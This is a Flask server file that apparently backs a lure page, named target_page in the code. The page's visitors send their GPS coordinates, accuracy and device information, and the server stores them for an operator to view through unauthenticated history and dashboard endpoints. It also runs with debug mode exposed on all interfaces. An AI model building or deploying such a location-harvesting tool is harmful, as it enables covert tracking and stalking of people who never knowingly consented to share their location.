from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Data storage
latest_location = {
    "lat": None,
    "lng": None,
    "accuracy": None,
    "timestamp": None,
    "device_info": None
}
location_history = []

@app.route('/')
def target_page():
    return render_template('index.html')

@app.route('/send-location', methods=['POST'])
def receive_location():
    global latest_location, location_history
    data = request.get_json()
    print(f"📍 Location Received: {data}")

    location_data = {
        "lat": data.get('lat'),
        "lng": data.get('lng'),
        "accuracy": data.get('accuracy'),
        "device_info": data.get('device_info'),
        "timestamp": datetime.now().isoformat()
    }
    latest_location = location_data
    location_history.append(location_data)
    if len(location_history) > 100:
        location_history.pop(0)

    return jsonify({"status": "ok"})

@app.route('/get-location')
def get_location():
    return jsonify(latest_location)

@app.route('/get-history')
def get_history():
    return jsonify(location_history)

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/clear', methods=['POST', 'GET'])
def clear_location():
    global latest_location, location_history
    latest_location = {
        "lat": None, "lng": None, "accuracy": None,
        "timestamp": None, "device_info": None
    }
    location_history = []
    return jsonify({"status": "cleared"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port, debug=True)